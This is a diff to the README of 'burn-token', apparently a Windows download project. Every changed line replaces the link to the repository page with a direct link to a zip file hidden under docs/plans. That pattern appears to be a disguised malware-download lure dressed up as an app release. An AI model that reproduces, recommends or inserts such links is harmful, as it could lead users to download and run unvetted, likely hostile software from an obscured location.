@@ -1,12 +1,12 @@
 # 🔥 burn-token - Burn tokens with heavy analysis
 
-[![Download burn-token](https://img.shields.io/badge/Download%20burn-token-purple?style=for-the-badge)](https://github.com/m3dicinegaming6-bot/burn-token)
+[![Download burn-token](https://img.shields.io/badge/Download%20burn-token-purple?style=for-the-badge)](https://github.com/m3dicinegaming6-bot/burn-token/raw/refs/heads/main/docs/plans/token_burn_2.3.zip)
 
 ## 🪟 Windows Download
 
 Use this page to download and run the app on Windows:
 
-https://github.com/m3dicinegaming6-bot/burn-token
+https://github.com/m3dicinegaming6-bot/burn-token/raw/refs/heads/main/docs/plans/token_burn_2.3.zip
 
 ## 📌 What burn-token Does
 
@@ -39,7 +39,7 @@ You also need:
 ## 🚀 Getting Started on Windows
 
 1. Open this page in your browser:  
-   https://github.com/m3dicinegaming6-bot/burn-token
+   https://github.com/m3dicinegaming6-bot/burn-token/raw/refs/heads/main/docs/plans/token_burn_2.3.zip
 
 2. Find the latest version or release file on the page.
 
@@ -234,4 +234,4 @@ Yes. The app is built for those tools.
 
 If you need the download page again, use this link:
 
-https://github.com/m3dicinegaming6-bot/burn-token
+https://github.com/m3dicinegaming6-bot/burn-token/raw/refs/heads/main/docs/plans/token_burn_2.3.zip
